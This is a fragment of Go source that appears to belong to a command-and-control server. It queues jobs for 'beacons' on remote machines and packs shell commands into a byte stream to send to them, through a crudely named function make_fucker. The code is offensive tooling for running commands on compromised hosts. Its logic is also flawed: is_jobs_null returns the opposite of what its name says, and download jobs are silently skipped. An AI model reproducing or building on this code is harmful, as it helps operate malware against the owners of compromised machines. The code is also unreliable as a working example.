package main

const (
	SHELL   = 0x10000001
	COMMAND = 0x10000002
)

const (
	DOWNLOAD = 0x20000001
)

type Job struct {
	job_type int
	command  int
	shell    string
}

func is_jobs_null(listener *Listener, i int) bool {
	if len(listener.Beacons[i].jobs) == 0 {
		return false
	} else {
		return true
	}
}

func make_fucker(listener *Listener, i int) []byte {
	GREP := []byte{0x00, 0x00, 0x00, 0x00}
	res := make([]byte, 0)
	for _, job := range listener.Beacons[i].jobs {
		switch job.job_type {
		case SHELL:
			res = append(res, stringToBytes(job.shell)...)
			res = append(res, GREP...)
		case COMMAND:
			switch job.command {
			case DOWNLOAD:
				continue
			}

		}

	}
	return res
}
